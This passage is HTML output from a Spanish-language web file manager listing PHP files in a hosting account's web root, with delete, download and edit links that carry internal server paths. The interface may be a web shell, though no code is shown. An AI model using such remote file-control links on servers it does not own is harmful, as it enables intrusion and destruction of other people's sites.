                    <td>2.52 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borradores.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borradores.php::borradores.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borradores.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-google.php">buscador-google.php</a></td>
                    <td>Archivo</td>
                    <td>10.12 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-google.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-google.php::buscador-google.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-google.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-skynet.php">buscador-skynet.php</a></td>
                    <td>Archivo</td>
                    <td>16.1 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-skynet.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-skynet.php::buscador-skynet.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-skynet.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-tags.php">buscador-tags.php</a></td>
                    <td>Archivo</td>
                    <td>16.01 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-tags.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-tags.php::buscador-tags.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-tags.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador.php">buscador.php</a></td>
                    <td>Archivo</td>
                    <td>19.21 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador.php::buscador.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadordegooles.php">buscadordegooles.php</a></td>
                    <td>Archivo</td>
                    <td>7.46 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadordegooles.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadordegooles.php::buscadordegooles.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadordegooles.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadorweb.php">buscadorweb.php</a></td>
                    <td>Archivo</td>
                    <td>19.36 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadorweb.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadorweb.php::buscadorweb.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadorweb.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::cambioex.php">cambioex.php</a></td>
                    <td>Archivo</td>
                    <td>1012 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cambioex.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cambioex.php::cambioex.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::cambioex.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chat.php">chat.php</a></td>
                    <td>Archivo</td>
                    <td>3.27 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chat.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chat.php::chat.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chat.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chatx.php">chatx.php</a></td>
                    <td>Archivo</td>
                    <td>3.28 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chatx.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chatx.php::chatx.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chatx.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::clima.php">clima.php</a></td>
                    <td>Archivo</td>
                    <td>421 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/clima.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/clima.php::clima.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::clima.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario-borrar.php">comentario-borrar.php</a></td>
                    <td>Archivo</td>
                    <td>887 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario-borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario-borrar.php::comentario-borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario-borrar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario3.php">comentario3.php</a></td>
                    <td>Archivo</td>
                    <td>2.66 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario3.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario3.php::comentario3.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario3.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentarios.php">comentarios.php</a></td>
                    <td>Archivo</td>
                    <td>1.83 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentarios.php::comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::conectados.php">conectados.php</a></td>
                    <td>Archivo</td>
                    <td>3.45 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/conectados.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/conectados.php::conectados.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::conectados.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto-form.php">contacto-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.59 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto-form.php::contacto-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto.php">contacto.php</a></td>
                    <td>Archivo</td>
                    <td>1.24 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto.php::contacto.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::datos_cambiar.php">datos_cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>1.19 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/datos_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/datos_cambiar.php::datos_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::datos_cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-form.php">denuncia-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.81 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-form.php::denuncia-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica-form.php">denuncia-publica-form.php</a></td>
                    <td>Archivo</td>
                    <td>7.2 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica-form.php::denuncia-publica-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica.php">denuncia-publica.php</a></td>
                    <td>Archivo</td>
                    <td>1.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica.php::denuncia-publica.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia.php">denuncia.php</a></td>
                    <td>Archivo</td>
                    <td>1.12 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia.php::denuncia.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncias.php">denuncias.php</a></td>
                    <td>Archivo</td>
                    <td>6.59 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncias.php::denuncias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncias.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.form.php">edicion.form.php</a></td>
                    <td>Archivo</td>
                    <td>14.57 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.form.php::edicion.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.php">edicion.php</a></td>
                    <td>Archivo</td>
                    <td>1.67 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.php::edicion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::emoticones.php">emoticones.php</a></td>
                    <td>Archivo</td>
                    <td>8.57 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/emoticones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/emoticones.php::emoticones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::emoticones.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::enlazanos.php">enlazanos.php</a></td>
                    <td>Archivo</td>
                    <td>2.85 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/enlazanos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/enlazanos.php::enlazanos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::enlazanos.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos-borrar2.php">favoritos-borrar2.php</a></td>
                    <td>Archivo</td>
                    <td>218 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos-borrar2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos-borrar2.php::favoritos-borrar2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos-borrar2.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.php">favoritos.php</a></td>
                    <td>Archivo</td>
                    <td>4.77 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.php::favoritos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.post.add.php">favoritos.post.add.php</a></td>
                    <td>Archivo</td>
                    <td>810 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.post.add.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.post.add.php::favoritos.post.add.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.post.add.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::header.php">header.php</a></td>
                    <td>Archivo</td>
                    <td>34.82 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/header.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/header.php::header.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::header.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::home.php">home.php</a></td>
                    <td>Archivo</td>
